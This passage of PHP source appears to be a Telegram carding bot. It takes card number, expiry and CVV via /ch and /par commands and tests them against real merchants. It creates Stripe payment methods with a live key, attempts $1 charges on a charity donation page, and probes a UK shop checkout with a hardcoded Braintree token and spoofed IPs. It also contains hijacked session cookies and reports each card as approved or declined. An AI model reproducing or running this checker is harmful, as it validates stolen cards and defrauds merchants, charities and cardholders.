sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.9',
    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

/////



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; __stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; __stripe_sid=8b7e9642-78a6-41c8-bd7f-aae798b3cac97331c7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.9',
    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}


// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Auth 3DS\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Pick up card - S') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Auth 3DS\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Auth 3DS\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
//    echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
//    echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}



elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes+%2F+$ano";

$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}                                                                                                    
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
	die();
}
                                                                                                     
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
	sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
	//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  //  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Baddress%5D%5Bpostal_code%5D=37435&billing_details%5Baddress%5D%5Bcity%5D=Pearland&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=543+w+belt+line+rd&billing_details%5Bemail%5D=poichad70%40rhyta.com&billing_details%5Bname%5D=Rigo++Perez&card%5Bnumber%5D=4169161444795073&card%5Bcvc%5D=588&card%5Bexp_month%5D=03&card%5Bexp_year%5D=29&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_POSTFIELDS => 'type=card&billing_details[address][postal_code]=37435&billing_details[address][city]=Pearland&billing_details[address][country]=US&billing_details[address][line1]=543+w+belt+line+rd&billing_details[email]=poichad70%40rhyta.com&billing_details[name]=Rigo++Perez&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$id = $data['id'];

curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.charitywater.org/donate/stripe',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'country=us&payment_intent%5Bemail%5D=poichad70%40rhyta.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bpayment_method%5D='.$id.'&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=poichad70%40rhyta.com&donation_form%5Bname%5D=Rigo+&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=Perez&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=543+w+belt+line+rd&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=Pearland&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=37435&donation_form%5Bmetadata%5D%5Bautomatically_subscribe_to_mailing_lists%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2Fdonate%23&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Biho_attributes%5D%5Bamount_hidden%5D=false&donation_form%5Biho_attributes%5D%5Bdelivery_notification%5D=false&donation_form%5Biho_attributes%5D%5Bdesign%5D=in-memory-us&donation_form%5Biho_attributes%5D%5Bfrom_full_name%5D=&donation_form%5Biho_attributes%5D%5Bhonoree_full_name%5D=&donation_form%5Biho_attributes%5D%5Bmessage%5D=&donation_form%5Biho_attributes%5D%5Brecipient_email%5D=&donation_form%5Biho_attributes%5D%5Brecipient_full_name%5D=&donation_form%5Biho_attributes%5D%5Bsend_to%5D=honoree&donation_form%5Biho_attributes%5D%5Btype%5D=email',
  CURLOPT_COOKIE => 'countrypreference=US; optimizelyEndUserId=oeu1727042234870r0.9385499213586781; builderSessionId=a769ef11f27d4ab1b3a938966f28ac00; _gcl_au=1.1.1117950168.1727042237; _ga=GA1.1.1588880688.1727042240; FPAU=1.1.1117950168.1727042237; analytics_ids=iMG2SMEYVxANgwK3sG6DVJErN5AMZXhH8ZprCWg87gUKTXEY9Za1iAb7yUKp1QiXj8uLKdYCgwVt4x42mSLnty%2BqG454tNwaHxlW8bSGAwf7XRk6nzHkCcRMjK3%2FF0Hcx2tfvZGBVYDcG9QxI9LDBty%2BUrdNNhgH0vnmQ5VAo1Ky--HO%2FSMhnzu5mRDR3p--2E5N%2FNov5%2BSGZh126foarQ%3D%3D; __stripe_mid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f; __stripe_sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd; _ga_5H0VND0XMD=GS1.1.1727042243.1.1.1727042676.0.0.1074196026; _ga_SKG6MDYX1T=GS1.1.1727042237.1.1.1727042719.0.0.694026822',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
//    'x-csrf-token: WeaTvtRa0ZL6skk_6DkEUGqjg6wp1bPyeAr8rNuQ_5KGioeVKhhuo7n--eqtWARWnaejjhSBdntJvIZLiNngiA',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept-language: es-US,es;q=0.9',
    'origin: https://www.charitywater.org',
    'referer: https://www.charitywater.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = $data['error']['message'];
curl_close($curl);
	

///VERIFICA EL TINPO DE PROCESAMIENTO///
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}
	

elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){

$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .par cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$ip = mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU4NTQyMDksImp0aSI6Ijg3NzNhMGEyLTlmZTktNDdmYy05OWE3LTNkNTdjNTI2MWM0MCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.s5bPsNsIz0WmjwXw-ptkYCExzMzdpuQmLmxyzwyynXJ0B1_9rf4odlJ6BjUY7wuQT-bdM_NEl1HwEpS0ZhMZLw';
$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzA3MDksImp0aSI6Ijk1NTkzNTI5LWM0YTgtNDIzZS04MDg5LWVlNTZmZGVhOGIwMCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.lBhDMncAdSTQga3pbtebyZZt6o3o4n8X8b3X9MNmXYPakLR-NRJ2vkrL4HOUMR4AWjjTZ1asFVt9_eKVm8EEJw';
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzEwNjUsImp0aSI6IjRmMzhiYmVlLTZlMTktNDgwZS1hZTQ0LTdkZjhkMjU4MDJiYyIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.r6T7HyGG9LAx_W8t4_6bNyUk7U5Dv6zQQsWA8zVuo06nLmSiyyVUUtq7Th2nebQrmQ7DmcL75XkBICIVYjhjZQ';
////EXTRAE EL NONCE DEL CHECK
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  //CURLOPT_COOKIE => '__kla_id=eyJlbWFpbCI6Impvam95MTc5NzBAb2Jpc2ltcy5jb20ifQ==; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_a54457280b903c6696cf9a36e4d4d7%7C%7C1725847493%7C%7C1725843893%7C%7Cb82249674b520797bcee1b0787ab4f14; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; PHPSESSID=0c2154e0d2efb4153ffdd1480e34e042; woocommerce_cart_hash=1fa770d3bf1c17129a4be48933557e14; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 